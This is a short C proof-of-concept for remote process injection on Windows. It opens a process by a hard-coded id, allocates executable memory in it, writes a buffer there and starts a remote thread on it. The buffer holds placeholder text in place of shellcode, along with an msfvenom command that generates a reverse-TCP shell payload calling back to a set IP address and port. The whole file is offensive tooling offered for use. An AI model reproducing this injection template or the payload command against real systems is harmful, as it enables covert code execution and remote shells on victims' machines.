//Remote Process Injection : POC

#include<stdio.h>
#include<windows.h>


int main(){
    char shellcode[] = {
        "Enter yur shell code, using command:(in kali linux terminal)"
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.9 LPORT=9999 -f c"
        };

    HANDLE hProcess; 
    HANDLE hThread;
    void* exec_mem;
    hProcess= OpenProcess(PROCESS_ALL_ACCESS, TRUE, 1048);
    exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, exec_mem, shellcode, sizeof(shellcode), NULL);
    hThread= CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);
    CloseHandle(hProcess);
    return 0;
}


